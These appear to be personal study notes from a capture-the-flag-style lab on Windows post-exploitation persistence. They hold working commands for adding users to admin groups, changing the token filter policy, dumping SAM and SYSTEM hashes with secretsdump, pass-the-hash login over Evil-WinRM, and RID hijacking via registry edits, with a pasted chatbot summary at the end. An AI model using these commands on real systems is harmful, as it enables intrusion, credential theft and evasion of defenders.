
After gaining the first foothold on your target's internal network, you'll want to ensure you don't lose access to it before actually getting to the crown jewels. Establishing persistence is one of the first tasks we'll have as attackers when gaining access to a network. In simple terms, persistence refers to creating alternate ways to regain access to a host without going through the exploitation phase all over again.


There are many reasons why you'd want to establish persistence as quick as possible, including:

    Re-exploitation isn't always possible: Some unstable exploits might kill the vulnerable process during exploitation, getting you a single shot at some of them.
    Gaining a foothold is hard to reproduce: For example, if you used a phishing campaign to get your first access, repeating it to regain access to a host is simply too much work. Your second campaign might also not be as effective, leaving you with no access to the network.
    The blue team is after you: Any vulnerability used to gain your first access might be patched if your actions get detected. You are in a race against the clock!



->> give unpriv users admin rights to avoid detection by blue 

group membership
=============
cmd->> net localgroup administrators thmuser /add ->to add user to admin group to be able to use win-evil rdp etc 
 

cmd->> net localgroup "backup operators" thmuser /add

then after that add user to "remote management group" '' to be able to login remotely


change localaccount filter policy to 1 for back up user to have admin priv
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1




note!!!!!!!! after reaching this step to make it more easier just do this command to get the hash direct

 impacket-secretsdump thmuser1:Password321@10.10.85.126  

sub name and passowrd for user if it dont work them procedd to use evilwm




We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:
AttackBox

*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!

        




With those files, we can dump the password hashes for all users using secretsdump.py or other similar tools:
AttackBox

user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL



user@AttackBox$ evil-winrm -i 10.10.71.166 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3





security descriptors
==============

->> export inf file and assign user to the restore and backup priv

->> import inf file and make it an .sdb
->> use imported inf file to configure sdb
->>open security descriptor and assign user .that all no trace 
->>comands
secedit /export /cfg config.inf
secedit /import /cfg config.inf /db config.sdb

!note for user to work freely with prov this has ti be changed vv
localAccountTokenFilterPolicy registry key,



rid hijacking
==================
n any Windows system, the default Administrator account is assigned the RID = 500, and regular users usually have RID >= 1000.

To find the assigned RIDs for any user, you can use the following command:
Command Prompt

C:\> wmic useraccount get name,sid


This lecture describes a **privilege escalation technique** on Windows systems known as **RID Hijacking** (Relative ID Hijacking).

Here is a summary of the key points for your notes:

## 🗝️ RID Hijacking Summary

---

### **Core Concept**
The method involves changing a **standard user's Relative ID (RID)** in the Windows Registry to match the **Administrator's default RID (500)**. When the user logs in, the operating system's **LSASS process** will assign them an **Administrator access token**, effectively granting them full administrative privileges.

### **Key Components**
* **RID (Relative ID):** A numeric identifier for a user account on the system.
    * **Administrator's default RID:** **500**.
    * **Regular User RIDs:** Typically **1000** or higher.
* **SID (Security Identifier):** A unique identifier for a user; the **RID is the last part** of the SID.
* **LSASS (Local Security Authority Subsystem Service):** The process that retrieves the user's RID from the registry upon login and creates the associated access token.
* **SAM Hive:** The part of the registry (**HKLM\SAM**) that stores user account information, including RIDs.

---

### **Steps for Execution (For Educational/Defensive Understanding)**
1.  **Find the Target User's RID:** Use the command `wmic useraccount get name,sid` to list all user SIDs and identify the target user's RID (the last part of their SID).
    * *Example:* For `thmuser3` with SID ending in **1010**, the RID is 1010 ($\text{0x3F2}$ in hex).
2.  **Gain SYSTEM Access to SAM:** The SAM hive is restricted to the **SYSTEM** account. Use a tool like **PsExec** to run the Registry Editor (`regedit`) as SYSTEM.
    * *Command:* `PsExec64.exe -i -s regedit`    psexec is a tool 
3.  **Locate the User's Registry Key:** Navigate to **HKLM\SAM\SAM\Domains\Account\Users\**. Find the key corresponding to the target user's RID in hexadecimal (e.g., `0x3F2`).
4.  **Modify the F Value:** Within the user's key, edit the binary value named **F**. The effective RID is stored at **position 0x30**.
    * The RID is stored in **little-endian** format.
    * *Change:* Replace the two bytes for the target user's RID (e.g., $0x3F2$ becomes $F2 03$) with the bytes for the Administrator's RID ($\text{500} = \text{0x01F4}$ becomes **F4 01**).
5.  **Re-Login:** with RDP The next time the user logs in, the LSASS process will read the modified value, associate the account with RID 500, and grant **Administrator privileges**.

---

### **Defensive Note**
This technique is a type of **post-exploitation** maneuver, as it **requires initial compromise** and the ability to run code or tools (like PsExec) on the system. The primary mitigation is **restricting execution of unauthorized tools** and ensuring a strong security posture to prevent the initial compromise.

Would you like to know more about the **mitigation strategies** for this type of registry manipulation?




